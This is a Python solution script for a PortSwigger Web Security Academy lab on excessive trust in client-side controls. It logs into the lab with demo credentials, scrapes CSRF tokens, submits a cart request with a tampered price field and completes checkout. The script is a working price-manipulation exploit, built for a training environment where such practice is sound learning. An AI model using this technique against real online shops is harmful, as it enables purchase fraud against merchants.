# Lab: Excessive trust in client-side controls
# difficulty: apprentice
import urllib3
import requests
from pwn import log
import base64
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
sub = '0ab5007804519e1582dad39300da0064'
url = f'https://{sub}.web-security-academy.net'
proxy = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(endpoint = '/'):
    log.info(f'getting csrf token for {endpoint}')
    res = s.get(f'{url}{endpoint}',
                verify=False,
                proxies=proxy
                )
    soup = BeautifulSoup(res.text, 'html.parser')
    try:
        csrf = soup.find("input", {'name': 'csrf'})['value']
    except:
        log.error("csrf token not found")
        exit(1)
    return csrf

def login():
    csrf = get_csrf_token('/login')
    body = {
        'username': 'wiener',
        'password': 'peter',
        'csrf': csrf,
    }
    
    res = s.post(url + '/login', data=body)
    if res.status_code != 200:
        log.error('login failed')
        exit(1)
    log.success('login successful')
    log.info('cookie: %s', s.cookies['session'].replace('%3d', '='))

def exploit():
    body = {
        'productId': 1,
        'quantity': 1,
        'price': 99,        # vulnerability
        'redir': 'PRODUCT', # required by server
    }

    r = s.post(f'{url}/cart', 
                data=body,
                allow_redirects=False,
                proxies=proxy,
                verify=False,
                )
    if r.status_code != 302:
        log.error('failed to add item to cart')
        exit(1)
    log.success('item added to cart')

    csrf = get_csrf_token('/cart')
    r = s.post(f'{url}/cart/checkout',
                data={'csrf': csrf},
                proxies=proxy,
                verify=False,
                )
    if r.status_code != 200:
        log.error('failed to checkout')
        exit(1)
    log.success('checked out')

if __name__ == '__main__':
    global s
    s = requests.Session()

    login()
    exploit()